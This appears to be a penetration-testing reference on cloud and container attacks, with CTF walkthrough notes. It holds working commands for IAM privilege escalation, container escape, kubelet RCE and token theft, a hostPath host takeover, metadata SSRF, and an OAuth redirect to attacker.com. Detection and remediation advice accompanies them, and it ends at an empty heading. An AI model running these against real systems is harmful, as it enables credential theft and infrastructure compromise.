# Cloud Security Attacks Reference

## Overview
Cloud security testing focuses on identifying misconfigurations, weak access controls, and vulnerabilities in cloud infrastructure, services, and applications.

**MITRE ATT&CK**: T1580 (Cloud Infrastructure Discovery), T1078.004 (Cloud Accounts), T1537 (Transfer Data to Cloud Account)

---

## AWS Security Testing

### Description
Testing Amazon Web Services environments for security weaknesses, misconfigurations, and excessive permissions.

### Common Vulnerabilities
- **Public S3 Buckets**: Exposed data
- **IAM Misconfigurations**: Excessive permissions
- **Security Group Issues**: Overly permissive rules
- **Exposed Credentials**: Hardcoded keys
- **Snapshot/AMI Exposure**: Public snapshots
- **Lambda Function Abuse**: Privilege escalation

### Tools
- ScoutSuite (multi-cloud auditing)
- Prowler (AWS security assessment)
- CloudMapper (AWS visualization)
- Pacu (AWS exploitation framework)
- aws-cli (official CLI)
- cloudsplaining (IAM assessment)
- S3Scanner (S3 bucket enumeration)

### Testing Methodology
1. Enumerate AWS resources
2. Review IAM policies and permissions
3. Check S3 bucket permissions
4. Audit security groups
5. Review CloudTrail logs
6. Test for privilege escalation
7. Check for exposed credentials
8. Enumerate public resources

### AWS CLI Enumeration
```bash
# Configure AWS CLI
aws configure

# Identity information
aws sts get-caller-identity

# List S3 buckets
aws s3 ls

# Check bucket permissions
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# List EC2 instances
aws ec2 describe-instances

# List IAM users
aws iam list-users

# Get user policies
aws iam list-user-policies --user-name username
aws iam list-attached-user-policies --user-name username

# List security groups
aws ec2 describe-security-groups

# List Lambda functions
aws lambda list-functions

# List RDS instances
aws rds describe-db-instances

# Enumerate exposed snapshots
aws ec2 describe-snapshots --owner-ids self

# Check for public snapshots
aws ec2 describe-snapshots --filters "Name=volume-size,Values=*" --query 'Snapshots[?Public==`true`]'
```

### Prowler Security Assessment
```bash
# Install Prowler
git clone https://github.com/prowler-cloud/prowler
cd prowler

# Run full assessment
./prowler -M text html json

# Check specific services
./prowler -s s3
./prowler -s iam

# Check specific region
./prowler -r us-east-1

# Output formats
./prowler -M html  # HTML report
./prowler -M json  # JSON output
```

### ScoutSuite
```bash
# Install ScoutSuite
pip install scoutSuite

# Run AWS audit
scout aws --profile default

# Run with specific services
scout aws --services s3,iam,ec2

# View report
python -m http.server 8000
# Open report.html
```

### S3 Bucket Testing
```bash
# S3Scanner
python3 s3scanner.py bucketname

# Test public access
aws s3 ls s3://bucket-name --no-sign-request

# Download from public bucket
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# Check for directory listing
curl http://bucket-name.s3.amazonaws.com/

# Test write access
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request
```

### LocalStack-Backed Cloud Challenges (`s3.<host>` subdomain → hypercorn-h11)

CTF/HTB cloud boxes often expose **LocalStack** (a local AWS emulator) on a
sibling vhost like `s3.<host>` rather than the real AWS endpoint. Fingerprint:
- `Server: hypercorn-h11` and `access-control-allow-headers` listing
  `x-localstack-target` and `x-amz-*` values.
- `GET /` returns `{"status": "running"}`; `GET /health` lists which AWS
  services are simulated (`{"services": {"s3": "running", "dynamodb":
  "running"}}`).

Authenticate to LocalStack with **`AWS_ACCESS_KEY_ID=test` /
`AWS_SECRET_ACCESS_KEY=test`** (default credentials accept any value). When
the system `aws` CLI cannot resolve the custom hostname (no `/etc/hosts`
write access), use boto3 with a `socket.getaddrinfo` monkeypatch:

```python
import socket
TARGET = "10.129.x.x"
HOSTS = {"s3.bucket.htb": TARGET, "bucket.htb": TARGET}
_o = socket.getaddrinfo
socket.getaddrinfo = lambda h, *a, **k: _o(HOSTS.get(h, h), *a, **k)

import boto3
from botocore.client import Config
s3 = boto3.client("s3", endpoint_url="http://s3.bucket.htb",
    aws_access_key_id="test", aws_secret_access_key="test",
    region_name="us-east-1",
    config=Config(s3={"addressing_style": "path"}))
print([b["Name"] for b in s3.list_buckets()["Buckets"]])
```

Reconnaissance sweep across LocalStack-emulated services:

```python
for svc in ["s3", "dynamodb", "sqs", "sns", "lambda",
            "secretsmanager", "ssm", "kms", "iam"]:
    c = boto3.client(svc, endpoint_url="http://s3.<host>",
        aws_access_key_id="test", aws_secret_access_key="test",
        region_name="us-east-1")
    # call the appropriate List/Describe and dump
```

Fast-path enumeration in priority order:
1. `s3.list_buckets()` then `list_objects_v2` per bucket
2. `s3.list_object_versions(Bucket=...)` (deleted/older files often
   contain creds the latest version was scrubbed of)
3. `s3.get_bucket_policy/cors/notification` (explains automatic processing)
4. `dynamodb.list_tables()` then `scan` each — these tables are the
   classic location for plaintext usernames/passwords
5. `secretsmanager.list_secrets()`, `ssm.describe_parameters()`
6. `lambda.list_functions()` + `lambda.get_function(...)` (download
   `Code.Location` for embedded creds in source)

Common exploitation primitives:
- **PutObject into web-served bucket** → upload a PHP shell or `.htaccess`
  if the bucket contents are synced into a writable webroot. Check the
  `Last-Modified` header on the bucket's object via the public website
  (e.g. `bucket.htb/index.html`) over time — periodic sync is a clear
  signal. **Watch for cleanup loops:** some boxes wipe non-original
  bucket keys every 20-60 s, so race the upload against the sync window.
- **DynamoDB `put_item` injection** → if a table is read by an internal
  PDF/email/notification pipeline, attacker rows can trigger SSRF, XSS,
  or arbitrary callbacks. Insert with `password` / `username` keys
  matching observed schema.
- **Versioned buckets** retain pre-cleanup content; `list_object_versions`
  + `get_object(VersionId=...)` recovers credentials that were
  overwritten on a later upload.
- **Lambda functions** with `--zip-file` updates can be hijacked when
  the boto3 client has IAM `lambda:UpdateFunctionCode`.

### IAM Privilege Escalation
```bash
# List IAM permissions
aws iam list-attached-user-policies --user-name user
aws iam get-policy-version --policy-arn arn --version-id v1

# Common privilege escalation paths:
# 1. CreateAccessKey on another user
aws iam create-access-key --user-name admin

# 2. AttachUserPolicy
aws iam attach-user-policy --user-name self --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. PutUserPolicy
aws iam put-user-policy --user-name self --policy-name escalate --policy-document file://admin-policy.json

# 4. CreatePolicyVersion
aws iam create-policy-version --policy-arn arn --policy-document file://admin.json --set-as-default

# 5. Lambda function with privileged role
aws lambda update-function-code --function-name func --zip-file fileb://payload.zip
```

### Pacu (AWS Exploitation Framework)
```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt

# Run Pacu
python3 pacu.py

# Import AWS keys
import_keys --profile default

# Enumerate permissions
run iam__enum_permissions

# Enumerate users and roles
run iam__enum_users_roles_policies_groups

# Detect vulnerable Lambda functions
run lambda__enum

# Privilege escalation
run iam__privesc_scan
```

### Detection Methods
- CloudTrail monitoring
- AWS GuardDuty alerts
- Config Rules compliance
- Unusual API activity
- Geographic anomalies
- Access Analyzer findings

### Remediation
- Enable CloudTrail logging
- Implement least privilege IAM
- Use IAM roles instead of access keys
- Enable MFA for all users
- Regular access reviews
- Encrypt S3 buckets
- Use SCPs (Service Control Policies)
- Enable GuardDuty
- Implement AWS Config rules
- Use AWS Security Hub

### References
- **MITRE ATT&CK**: T1580, T1078.004, T1552.001
- **CWE**: CWE-732 (Incorrect Permission Assignment)
- **AWS**: Security Best Practices
- **Tools**: https://github.com/RhinoSecurityLabs/pacu

---

## Azure Security Testing

### Description
Testing Microsoft Azure environments for security issues and misconfigurations.

### Common Vulnerabilities
- **Public Storage Accounts**: Exposed blobs
- **Excessive RBAC Permissions**: Over-privileged accounts
- **Network Security Group Issues**: Open rules
- **Managed Identity Abuse**: Service principal compromise
- **Key Vault Misconfigurations**: Exposed secrets
- **Public Virtual Machines**: Exposed VMs

### Tools
- ScoutSuite (multi-cloud)
- Azure CLI (az)
- PowerShell Az module
- ROADtools (Azure AD assessment)
- Stormspotter (Azure visualization)
- MicroBurst (Azure security assessment)
- Azucar (Azure security auditing)

### Testing Methodology
1. Enumerate Azure resources
2. Review RBAC assignments
3. Check storage account permissions
4. Audit network security groups
5. Review Key Vault access policies
6. Test for privilege escalation
7. Enumerate managed identities
8. Check for exposed VMs

### Azure CLI Enumeration
```bash
# Login to Azure
az login

# Get account information
az account show

# List subscriptions
az account list

# List resource groups
az group list

# List storage accounts
az storage account list

# Check storage account access
az storage account show --name accountname

# List public containers
az storage container list --account-name accountname

# List virtual machines
az vm list

# List network security groups
az network nsg list

# Show NSG rules
az network nsg rule list --nsg-name nsg-name --resource-group rg-name

# List Key Vaults
az keyvault list

# List secrets in Key Vault
az keyvault secret list --vault-name vault-name

# Get secret value
az keyvault secret show --vault-name vault-name --name secret-name

# List role assignments
az role assignment list

# Check user permissions
az role assignment list --assignee user@domain.com
```

### PowerShell Azure Enumeration
```powershell
# Connect to Azure
Connect-AzAccount

# Get current context
Get-AzContext

# List subscriptions
Get-AzSubscription

# List resource groups
Get-AzResourceGroup

# List storage accounts
Get-AzStorageAccount

# List VMs
Get-AzVM

# List NSGs
Get-AzNetworkSecurityGroup

# Get NSG rules
Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg

# List Key Vaults
Get-AzKeyVault

# List role assignments
Get-AzRoleAssignment

# Check managed identities
Get-AzUserAssignedIdentity
```

### Storage Account Testing
```bash
# Test anonymous access
az storage blob list --account-name accountname --container-name containername --auth-mode login

# Without authentication
curl https://accountname.blob.core.windows.net/container/

# Download blob
az storage blob download --account-name accountname --container-name container --name file.txt --file ./file.txt

# List containers anonymously
curl https://accountname.blob.core.windows.net/?comp=list
```

### ROADtools (Azure AD)
```bash
# Install ROADtools
pip install roadrecon

# Authenticate
roadrecon auth --username user@domain.com --password pass

# Gather data
roadrecon gather

# Start GUI
roadrecon gui
```

### MicroBurst
```powershell
# Import MicroBurst
Import-Module MicroBurst.psm1

# Enumerate Azure resources
Get-AzureDomainInfo -domain target.onmicrosoft.com

# Find public storage containers
Invoke-EnumerateAzureBlobs -Base target

# Get RunAs accounts
Get-AzureRunAsAccounts

# Get available VM extensions
Get-AzureVMExtensionSettings
```

### Privilege Escalation Paths
```bash
# Contributor role on subscription
# Can create new resources, including VMs with scripts

# Owner role on resource
# Can modify RBAC permissions

# User Access Administrator
# Can grant permissions to self or others

# Global Administrator (Azure AD)
# Can elevate to subscription Owner

# Application Administrator
# Can reset credentials for service principals
```

### Detection Methods
- Azure Monitor alerts
- Azure Security Center
- Activity log monitoring
- Conditional Access policies
- Sentinel (SIEM)
- Unusual authentication patterns

### Remediation
- Implement least privilege RBAC
- Enable Azure Security Center
- Use Managed Identities
- Implement Conditional Access
- Enable MFA for all users
- Regular access reviews
- Encrypt storage accounts
- Use private endpoints
- Implement Azure Policy
- Enable Azure Sentinel

### References
- **MITRE ATT&CK**: T1078.004, T1580
- **CWE**: CWE-284 (Improper Access Control)
- **Microsoft**: Azure Security Best Practices
- **Tools**: https://github.com/dirkjanm/ROADtools

---

## Google Cloud Platform (GCP) Security

### Description
Testing Google Cloud Platform for security vulnerabilities and misconfigurations.

### Common Vulnerabilities
- **Public Storage Buckets**: Exposed GCS objects
- **IAM Misconfigurations**: Over-permissive roles
- **Firewall Rules**: Open ingress rules
- **Service Account Key Exposure**: Leaked credentials
- **Compute Instance Metadata**: SSRF vulnerabilities
- **Public Compute Instances**: Exposed VMs

### Tools
- ScoutSuite
- gcloud CLI
- GCPBucketBrute
- CloudMapper
- Forseti Security
- IAM Privilege Escalation Scanner

### Testing Methodology
1. Enumerate GCP resources
2. Review IAM policies
3. Check GCS bucket permissions
4. Audit firewall rules
5. Test compute instance metadata
6. Check for privilege escalation
7. Review service account permissions
8. Enumerate public resources

### gcloud CLI Enumeration
```bash
# Authenticate
gcloud auth login

# List projects
gcloud projects list

# Set active project
gcloud config set project project-id

# Get current configuration
gcloud config list

# List compute instances
gcloud compute instances list

# List storage buckets
gsutil ls

# Check bucket permissions
gsutil iam get gs://bucket-name

# List bucket contents
gsutil ls gs://bucket-name

# List firewall rules
gcloud compute firewall-rules list

# Show firewall rule details
gcloud compute firewall-rules describe rule-name

# List IAM policies
gcloud projects get-iam-policy project-id

# List service accounts
gcloud iam service-accounts list

# List service account keys
gcloud iam service-accounts keys list --iam-account=sa@project.iam.gserviceaccount.com
```

### GCS Bucket Testing
```bash
# Test anonymous access
gsutil ls gs://bucket-name/

# Download from public bucket
gsutil cp gs://bucket-name/file.txt .

# Test write access
gsutil cp test.txt gs://bucket-name/test.txt

# Make object public (if permissions allow)
gsutil acl ch -u AllUsers:R gs://bucket-name/file.txt

# Enumerate buckets
for name in company-backups company-data company-files; do
  gsutil ls gs://$name 2>&1
done
```

### Compute Instance Metadata
```bash
# Access metadata (from compromised instance)
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
  -H "Metadata-Flavor: Google"

# Get service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Get service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# Use in SSRF attacks
# If application makes HTTP requests based on user input:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### IAM Privilege Escalation
```bash
# Common escalation paths:

# 1. iam.serviceAccounts.actAs
gcloud iam service-accounts keys create key.json \
  --iam-account=privileged-sa@project.iam.gserviceaccount.com

# 2. iam.serviceAccountKeys.create
gcloud iam service-accounts keys create newkey.json \
  --iam-account=target-sa@project.iam.gserviceaccount.com

# 3. compute.instances.setMetadata (add SSH keys)
gcloud compute instances add-metadata instance-name \
  --metadata-from-file ssh-keys=keys.txt

# 4. cloudfunctions.functions.setIamPolicy
gcloud functions add-iam-policy-binding function-name \
  --member=user:attacker@gmail.com \
  --role=roles/cloudfunctions.invoker

# 5. resourcemanager.projects.setIamPolicy
gcloud projects add-iam-policy-binding project-id \
  --member=user:attacker@gmail.com \
  --role=roles/owner
```

### ScoutSuite for GCP
```bash
# Run GCP audit
scout gcp --user-account

# Or with service account
scout gcp --service-account key.json

# View report
# Open scoutsuite-report/scoutsuite_results_gcp.html
```

### Detection Methods
- Cloud Audit Logs
- Security Command Center
- Anomaly detection
- Firewall logs
- VPC Flow Logs
- Access Transparency logs

### Remediation
- Implement least privilege IAM
- Use organization policies
- Enable VPC Service Controls
- Implement private Google access
- Rotate service account keys
- Enable Cloud Armor
- Use Binary Authorization
- Implement Security Command Center
- Regular IAM audits
- Enable audit logging

### References
- **MITRE ATT&CK**: T1078.004, T1552.001
- **CWE**: CWE-732
- **Google**: GCP Security Best Practices
- **SSRF**: Metadata service exploitation

---

## MinIO / Self-Hosted S3 Exploitation

### Description
MinIO is a self-hosted S3-compatible object storage server commonly found on non-standard ports (9000, 54321, etc.). It often contains sensitive backups, SSH keys, and configuration files.

### Enumeration
```bash
# Discover MinIO service (scan alternate ports)
for port in 9000 9001 54321 8333; do
  curl -s -o /dev/null -w "%{http_code}" "http://target:$port/minio/health/live" && echo " → MinIO on port $port"
done

# Configure MinIO client (mc) with discovered/default credentials
mc alias set target http://target:9000 minioadmin minioadmin

# Full admin info (if root credentials work)
mc admin info target

# Export all IAM data (users, policies, buckets)
mc admin cluster iam export target

# List all buckets (including hidden ones like "internal")
mc ls target

# Recursively list bucket contents
mc ls --recursive target/bucket-name

# Download entire bucket
mc cp --recursive target/bucket-name/ ./loot/
```

### Common Findings in MinIO
- **Hidden buckets** — buckets named `internal`, `backups`, `private`, `admin` may contain SSH keys, database dumps, home directory archives
- **SSH keys in backups** — look for `.ssh/` directories, `id_rsa`, `id_ed25519` in tar/zip archives
- **Unauthenticated PUT via nginx proxy** — if MinIO sits behind nginx, the proxy may allow unauthenticated PUT requests to upload files

### What Does NOT Work for RCE on MinIO
These are common dead ends — do not waste time on them:
- **`mc admin update`** — MinIO validates binary signatures with a hardcoded minisign public key; cannot upload a malicious binary
- **`mc admin service restart`** — uses `syscall.Exec` (same PID), systemd does not notice the restart, startup scripts do not re-run
- **`mc admin service stop`** — clean exit (code 0), `Restart=on-failure` in systemd does not trigger a restart
- **Path traversal in S3 object keys** — MinIO blocks `..` in keys (`XMinioInvalidResourceName`); URL-encoded `%2e%2e` creates literal directories, not traversal
- **Environment variable injection via `mc admin config`** — not supported

### Post-Exploitation Workflow
1. **List and download all buckets** — especially hidden/internal ones
2. **Search for credentials** — SSH keys, `.env` files, database configs, API keys
3. **Crack SSH key passphrases** — if keys are encrypted (see authentication/reference/default-credentials.md)
4. **Pivot via SSH** — use recovered keys to access the host or other systems
5. **Read systemd service files** — `cat /etc/systemd/system/minio.service` reveals environment variables, startup flags, `Restart=` policy

### References
- **MITRE ATT&CK**: T1530 (Data from Cloud Storage Object)
- **CWE**: CWE-732 (Incorrect Permission Assignment)

---

## Container Security (Docker/Kubernetes)

### Description
Testing containerized applications and orchestration platforms for security vulnerabilities.

### Docker Vulnerabilities
- **Privileged Containers**: Running with --privileged
- **Docker Socket Exposure**: Mounting /var/run/docker.sock
- **Vulnerable Images**: Outdated base images
- **Secrets in Images**: Hardcoded credentials
- **Host Namespace Sharing**: --pid=host, --net=host
- **Insecure Registries**: Unencrypted/unauthenticated

### Kubernetes Vulnerabilities
- **Anonymous Access**: Unauthenticated API access
- **RBAC Misconfigurations**: Excessive permissions
- **Exposed Dashboard**: Public Kubernetes dashboard
- **Privileged Pods**: securityContext.privileged
- **HostPath Mounts**: Mounting host filesystem
- **Secrets Management**: Unencrypted secrets

### Tools
- kube-hunter (Kubernetes penetration testing)
- kubectl (Kubernetes CLI)
- kube-bench (CIS benchmark)
- docker (Docker CLI)
- Trivy (vulnerability scanner)
- Anchore (container analysis)
- kubeaudit
- kubeletctl

### Testing Methodology
1. Enumerate exposed services
2. Test authentication mechanisms
3. Review RBAC permissions
4. Scan container images
5. Test for container escape
6. Check for exposed secrets
7. Audit network policies
8. Test privilege escalation

### Docker Security Testing
```bash
# Check Docker version
docker version

# List containers
docker ps

# Inspect container
docker inspect container_id

# Check for privileged containers
docker inspect container_id | grep -i privileged

# Check capabilities
docker inspect container_id | grep -i cap

# Check mounted volumes
docker inspect container_id | grep -A 10 Mounts

# Scan image for vulnerabilities
trivy image imagename:tag

# Check for secrets in image
docker history imagename:tag --no-trunc
docker inspect imagename:tag

# Test Docker socket exposure (from inside container)
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Escape from privileged container
docker run --rm --privileged -it ubuntu bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
```

### Kubernetes Enumeration
```bash
# Check cluster info
kubectl cluster-info

# List namespaces
kubectl get namespaces

# List pods
kubectl get pods --all-namespaces

# List services
kubectl get services --all-namespaces

# Check RBAC permissions
kubectl auth can-i --list

# Check current permissions
kubectl auth can-i create pods
kubectl auth can-i '*' '*'

# Get service account token (from pod)
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# List secrets
kubectl get secrets --all-namespaces

# Decode secret
kubectl get secret secret-name -o jsonpath='{.data.password}' | base64 -d

# Check for privileged pods
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.securityContext.privileged==true)'
```

### kube-hunter
```bash
# Install kube-hunter
pip install kube-hunter

# Run active scan (from outside)
kube-hunter --remote cluster-ip

# Run from within cluster
kube-hunter --pod

# Run specific tests
kube-hunter --active
```

### kube-bench (CIS Benchmark)
```bash
# Run kube-bench
docker run --pid=host --privileged -v /etc:/etc:ro -v /var:/var:ro \
  aquasec/kube-bench:latest run --targets master,node

# Or install and run
kube-bench run --targets master,node
```

### Kubernetes API Testing
```bash
# Test anonymous access
curl -k https://kubernetes-api:6443/api/v1/namespaces

# With token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces

# Create privileged pod (if permissions allow)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attack-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: attack
    image: ubuntu
    command: ["/bin/bash", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
```

### Unauthenticated Kubelet API Exploitation (Port 10250)
```bash
# Kubelet API often has weaker auth than K8s API (8443)
# Test unauthenticated access — list all pods
curl -ks https://TARGET:10250/pods | jq '.items[].metadata | {name, namespace}'

# Execute commands in a pod (RCE as container root)
curl -ks https://TARGET:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=id"

# Extract service account token from pod
curl -ks https://TARGET:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Use SA token to enumerate permissions via SelfSubjectAccessReview
TOKEN="<extracted_token>"
curl -ks -X POST https://TARGET:8443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'

# If SA can create pods: mount host filesystem via hostPath
curl -ks -X POST https://TARGET:8443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"hostmount"},"spec":{"containers":[{"name":"c","image":"nginx","volumeMounts":[{"mountPath":"/hostfs","name":"host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'

# Read host files through the new pod via kubelet
curl -ks https://TARGET:10250/run/default/hostmount/c -d "cmd=cat /hostfs/etc/shadow"
```
**Key pattern**: kubelet (10250) → pod exec → SA token → K8s API (8443) → create hostPath pod → host filesystem. Even limited SA permissions (create pods only, no secrets) enable full host compromise.

### Container Escape Techniques
```bash
# Privileged container escape
# Mount host filesystem via cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /tmp/shadow' >> /cmd
chmod +x /cmd

# Docker socket escape
docker run -v /:/host -it ubuntu chroot /host

# HostPath mount exploitation
kubectl exec -it pod-name -- /bin/bash
cd /host-mount
# Access host filesystem
```

### Detection Methods
- Runtime security monitoring
- Audit logs (Kubernetes)
- Network policies
- Pod Security Policies/Standards
- Admission controllers
- Container image scanning
- Behavioral analysis

### Remediation
- Never use --privileged unless absolutely necessary
- Implement Pod Security Standards
- Use network policies
- Enable RBAC
- Scan images for vulnerabilities
- Use minimal base images
- Implement admission controllers
- Enable audit logging
- Use secrets management (Vault, Sealed Secrets)
- Regular security scanning
- Implement runtime security (Falco)

### References
- **MITRE ATT&CK**: T1611 (Escape to Host)
- **CWE**: CWE-250
- **Kubernetes**: Security Best Practices
- **Docker**: Security Documentation
- **CIS**: Docker and Kubernetes Benchmarks

---

## Serverless Security

### Description
Testing serverless functions (AWS Lambda, Azure Functions, Google Cloud Functions) for security issues.

### Common Vulnerabilities
- **Function Injection**: Code injection in functions
- **Excessive Permissions**: Over-privileged IAM roles
- **Secrets Exposure**: Hardcoded credentials
- **Event Injection**: Malicious event data
- **Dependency Vulnerabilities**: Outdated packages
- **Resource Exhaustion**: DoS via function invocations

### AWS Lambda Testing
```bash
# List functions
aws lambda list-functions

# Get function details
aws lambda get-function --function-name function-name

# Get function configuration
aws lambda get-function-configuration --function-name function-name

# Invoke function
aws lambda invoke --function-name function-name --payload '{"key":"value"}' output.txt

# Get function policy
aws lambda get-policy --function-name function-name

# Check environment variables (may contain secrets)
aws lambda get-function-configuration --function-name name | jq .Environment

# Download function code
aws lambda get-function --function-name name --query 'Code.Location' --output text
# Download from the URL returned
```

### Testing for Vulnerabilities
```bash
# Injection testing
# Invoke with malicious payloads
aws lambda invoke --function-name function-name \
  --payload '{"command": "cat /etc/passwd"}' output.txt

# SSRF testing
aws lambda invoke --function-name function-name \
  --payload '{"url": "http://169.254.169.254/latest/meta-data/"}' output.txt

# Resource exhaustion
for i in {1..1000}; do
  aws lambda invoke --function-name function-name output-$i.txt &
done
```

### Detection Methods
- CloudWatch Logs
- CloudTrail (invocation logging)
- X-Ray tracing
- Unusual invocation patterns
- Error rate monitoring
- Performance metrics

### Remediation
- Implement least privilege
- Input validation
- Secrets management (Parameter Store, Secrets Manager)
- Dependency scanning
- Rate limiting
- Function timeout configuration
- VPC integration for network isolation
- Code signing
- Environment variable encryption

### References
- **MITRE ATT&CK**: T1578 (Modify Cloud Compute Infrastructure)
- **CWE**: CWE-94 (Code Injection)
- **OWASP**: Serverless Top 10
- **Tools**: Serverless Security Toolkit

---

## SaaS Security Testing

### Description
Testing Software-as-a-Service applications for security issues.

### Common Issues
- **OAuth Misconfigurations**: Improper OAuth implementation
- **API Security**: Weak API authentication/authorization
- **Data Exposure**: Publicly accessible data
- **Subdomain Takeovers**: Abandoned DNS entries
- **Third-party Integrations**: Insecure integrations

### Testing Methodology
1. Enumerate subdomains and services
2. Test OAuth flows
3. API security testing
4. Check for subdomain takeovers
5. Review third-party integrations
6. Test data access controls
7. Check for information disclosure

### Subdomain Enumeration
```bash
# subfinder
subfinder -d target.com -o subdomains.txt

# amass
amass enum -d target.com

# Check for takeover possibilities
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
```

### OAuth Testing
```bash
# Test redirect_uri manipulation
# Original: ?redirect_uri=https://app.example.com/callback
# Test: ?redirect_uri=https://attacker.com/callback

# Test state parameter
# Missing state = CSRF vulnerability

# Test scope escalation
# Request: scope=read
# Try: scope=read write admin
```

### Detection Methods
- API gateway monitoring
- OAuth audit logs
- Behavioral analytics
- Data access monitoring

### Remediation
- Implement proper OAuth validation
- Use API gateways
- Regular subdomain audits
- Monitor third-party integrations
- Implement data loss prevention
- Regular security assessments

### References
- **MITRE ATT&CK**: T1199 (Trusted Relationship)
- **OWASP**: API Security Top 10
- **OAuth**: Security Best Practices

---

## Docker Container Enumeration (Post-Shell)

**When to use:** You have a shell inside a Docker container and need to escalate or find sensitive data.

**Enumeration steps:**
1. **Detect container** — `cat /proc/1/cgroup 2>/dev/null | grep docker`, check `/.dockerenv`, or `hostname` showing container ID
2. **Bind mount discovery** — `cat /proc/1/mountinfo | grep -v '/proc\|/sys\|/dev'` reveals host paths mapped into container. Look for: cert directories, home directories, config files, flag files
3. **Credential hunt** — check env vars (`cat /proc/1/environ | tr '\0' '\n'`), mounted configs, app source code for commented creds, `.env` files, database connection strings
4. **Cookie/role manipulation** — web panels may use client-side role cookies (e.g., `UserRole=admin`) to gate admin features like file upload. Always check if setting role cookies unlocks hidden functionality
5. **Network discovery** — `cat /proc/net/fib_trie` or `ip route` to find Docker networks, gateway (usually Docker host at x.x.x.1)
6. **Docker host access** — try SSH to gateway IP with found creds. Check if Docker socket is mounted (`ls /var/run/docker.sock`)
7. **Other containers** — if Docker socket accessible: `docker ps`, `docker exec` into other containers

---

## Kubernetes Service-Account Token Pivot (Multi-Namespace RBAC Climb)

**Pattern from HTB Unobtainium (k3s, multi-pod cluster):**
A foothold pod's default SA in namespace A may have *no* useful permissions, but `pods` LIST in another namespace B is granted. Pivot:

1. **From foothold pod (default SA), list namespaces** via `curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces`. 403 on most resources is fine — keep walking.
2. **Probe each namespace** for `pods` listing — find one that returns a `PodList` (e.g., `dev`).
3. **Discover that pod's IP** from the listing. If the pod runs the *same vulnerable app* (often the case in HTB-style boxes), the same RCE/cmdi works against it from the foothold pod's network.
4. **Re-RCE the higher-priv pod** to dump *its* `/run/secrets/kubernetes.io/serviceaccount/token`. That token has different RBAC — typically can list `secrets` in `kube-system`.
5. **Search kube-system secrets** for a service-account token whose name contains `admin`/`cluster`/`c-admin`. Decode the `data.token` (base64) to get a JWT; the `sub` field reveals the SA (`system:serviceaccount:kube-system:c-admin`).
6. **Verify cluster-admin** by listing `nodes` or creating a `Namespace`. If success → full cluster compromise.

### Read host filesystem after cluster-admin
- `image: alpine` will fail if cluster has no internet egress (`image can't be pulled`). **Always reuse a local-registry image** discovered in existing pod specs (e.g., `localhost:5000/node_server`).
- Pod with `volumes: [{name: hostfs, hostPath: {path: /}}]` and `mountPath: /host` exposes node root.
- Easiest exfil: have the container `cat` target files to **stdout**, then read pod logs via `GET /api/v1/namespaces/<ns>/pods/<name>/log` — no exec/SPDY needed.
- The host's `/root/root.txt` (and other privileged files) are at `/host/root/root.txt` inside the pod.

### Shell-output exfil through a load-balanced webapp pod
When the foothold is a webapp running as a multi-replica `Deployment`, each HTTP request may hit a different pod. Files written to one pod's local FS are invisible to others — and the LFI read endpoint may go to a different pod than the upload one.
- **Solution:** repeat the upload (write) **N times** (≥10) so most pods receive the file, then retry the LFI read with backoff until one pod returns content.
- Alternatively send all output to **stdout of a one-shot pod** and read it via Kubernetes `pods/log` API — single source of truth.

---

## Lodash `_.merge` Prototype Pollution — `constructor.prototype` Variant

**Symptom:** `__proto__` injection appears to land (`{"ok": true}`) but the polluted property isn't visible to subsequent code.
**Cause:** Newer lodash (≥ 4.17.5) sanitizes the literal key `__proto__` but still merges `constructor.prototype.<key>`.
**Working payload:**
```json
{"auth": {...}, "message": {"constructor": {"prototype": {"canUpload": true}}}}
```
After this single PUT, every plain object in the Node process has `canUpload === true` via prototype-chain lookup, so `findUser(...)` returns a user that *passes* `if (!user.canUpload)` checks. Used on HTB Unobtainium to upgrade `felamos` from message-poster to authenticated `/upload` cmd-injection.

---

## Azure AD Connect — `(localdb)\.\ADSync` Connection Failure on WinRM

